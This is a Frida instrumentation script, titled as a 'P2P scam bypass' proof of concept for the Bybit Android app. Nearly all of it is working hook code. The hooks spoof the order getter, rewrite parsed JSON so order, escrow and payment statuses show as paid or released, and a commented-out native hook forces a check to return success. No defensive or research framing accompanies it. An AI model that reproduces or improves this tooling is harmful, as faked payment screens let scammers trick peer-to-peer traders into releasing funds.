/* 
   BYBIT P2P SCAM BYPASS PoC (Frida)
   Target: libbybit.so / Java Layer
   Goal: Force P2P order status to "PAID" or "COMPLETED" client-side
   
   Usage: frida -U -f com.bybit.app -l p2p_bypass.js
*/

Java.perform(function () {
    console.log("[*] Starting Bybit P2P Bypass Hook...");

    // 1. Hooking Order Status Class (Hypothetical Name - needs reversing to confirm)
    // Look for classes like: com.bybit.p2p.data.Order, com.bybit.biz.p2p.OrderStatus
    
    // Strategy A: Hook the method that returns Order Status
    try {
        var OrderDetails = Java.use("com.bybit.p2p.data.entity.OrderDetails");
        
        OrderDetails.getStatus.implementation = function () {
            console.log("[+] getStatus() called. Original: " + this.getStatus());
            console.log("[!] Spoofing status to PAID (20)");
            return 20; // Assuming 20 = Paid/Released
        };
    } catch (e) {
        console.log("[-] Class com.bybit.p2p.data.entity.OrderDetails not found. Check obfuscation.");
    }

    // Strategy B: Hook JSON Response Parsing (OkHttp3 / Retrofit)
    // UPDATED: Better logging and escrow detection
    try {
        var Gson = Java.use("com.google.gson.Gson");
        
        Gson.fromJson.overload('java.lang.String', 'java.lang.Class').implementation = function (json, cls) {
            var classStr = cls.toString();
            
            // Check if we are parsing P2P Order response
            if (json.includes('"status":') && (json.includes("orderId") || json.includes("p2p"))) {
                console.log("=".repeat(60));
                console.log("[*] INTERCEPTED P2P ORDER RESPONSE");
                console.log("[*] Class: " + classStr);
                
                // Extract key fields
                var orderIdMatch = json.match(/"orderId":"([^"]+)"/);
                var statusMatch = json.match(/"status":(\d+)/);
                var escrowMatch = json.match(/"escrowStatus":(\d+)/);
                
                if (orderIdMatch) console.log("[*] Order ID: " + orderIdMatch[1]);
                if (statusMatch) console.log("[*] Original Status: " + statusMatch[1]);
                if (escrowMatch) console.log("[*] Escrow Status: " + escrowMatch[1]);
                
                // Modify JSON: Force PAID + RELEASED
                var newJson = json;
                newJson = newJson.replace(/"status":\s*\d+/g, '"status":20');  // 20 = Paid
                newJson = newJson.replace(/"orderStatus":\s*\d+/g, '"orderStatus":20');
                newJson = newJson.replace(/"escrowStatus":\s*\d+/g, '"escrowStatus":30'); // 30 = Released (guess)
                newJson = newJson.replace(/"paymentStatus":\s*\d+/g, '"paymentStatus":1'); // 1 = Confirmed
                
                console.log("[!] SPOOFED Status -> 20 (PAID)");
                console.log("[!] SPOOFED Escrow -> 30 (RELEASED)");
                console.log("=".repeat(60));
                
                return this.fromJson(newJson, cls);
            }
            
            return this.fromJson(json, cls);
        };
        console.log("[+] Gson hook installed successfully!");
    } catch (e) {
        console.log("[-] Gson hook failed: " + e);
    }
    
    // Strategy C: Native Hook (libbybit.so) for critical logic
    // If they use native C++ for signing/status check
    /*
    var moduleName = "libbybit.so";
    var nativeFunc = "Java_com_bybit_jni_P2P_checkStatus"; // Example
    
    try {
        Interceptor.attach(Module.findExportByName(moduleName, nativeFunc), {
            onEnter: function (args) {
                console.log("[Native] P2P Check Entered");
            },
            onLeave: function (retval) {
                console.log("[Native] Return: " + retval);
                retval.replace(1); // Force True/Success
            }
        });
    } catch(e) {}
    */
    
    console.log("[*] Hooks installed. Try opening a P2P order.");
});
